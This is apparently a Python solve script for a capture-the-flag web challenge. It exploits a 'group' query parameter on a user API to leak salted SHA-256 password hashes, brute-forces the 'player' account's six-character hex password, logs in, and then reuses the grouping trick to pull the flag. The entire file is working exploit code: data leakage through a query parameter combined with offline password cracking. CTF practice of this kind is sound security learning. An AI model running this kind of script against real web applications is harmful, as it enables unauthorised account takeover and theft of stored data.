import requests
import os
import hashlib
import itertools

BASE_URL = "https://challenge.local"

s = requests.session()
r = s.get(f"{BASE_URL}/api/users/?group=password")
j = r.json()

player_password_hash = None
for k, v in j.get('users').items():
    if v[0].get('username') == 'player':
        player_password_hash = k

print(j)

#
# Step 1: find password
#

def compute_hash(password, salt=None):
    if salt is None:
        salt = os.urandom(4).hex()
    return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()

salt, digest = player_password_hash.split('.')
player_password = None

for v in itertools.product('abcdef1234567890', repeat=6):
    player_password = ''.join(v)
    if player_password_hash == compute_hash(player_password, salt=salt):
        print(f"Password found: {player_password}")
        break


#
# Step 2: login
#
r = s.post(f"{BASE_URL}/login/", data={'username': 'player', 'password': player_password})
print(r)

#
# Step 3: get flag by grouping
#
r = s.get(f"{BASE_URL}/api/attempts/?group=flag")
print(r.json())